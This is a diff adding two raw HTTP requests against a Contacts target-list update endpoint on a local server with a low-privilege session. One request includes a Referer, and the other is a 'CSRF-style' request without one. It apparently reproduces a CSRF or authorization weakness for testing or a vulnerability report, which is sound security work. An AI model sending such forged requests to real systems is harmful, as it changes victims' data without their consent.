@@ -1,0 +1,16 @@
+### (a) normal add, with Referer
+POST /index.php?module=Contacts&action=targetlistupdate HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<low-priv session>
+Referer: http://localhost:33116/index.php?module=Contacts&action=index
+Content-Type: application/x-www-form-urlencoded
+
+uids=4350a7d1-c540-4066-9f2e-46cf1a21d8d4&prospect_list=f009c879-fdd1-49bc-85b9-c4236c46b684
+
+### (b) CSRF-style add, NO Referer header at all
+POST /index.php?module=Contacts&action=targetlistupdate HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<low-priv session>
+Content-Type: application/x-www-form-urlencoded
+
+uids=a6c64019-ea96-4129-9801-d788db5d2f73&prospect_list=f009c879-fdd1-49bc-85b9-c4236c46b684
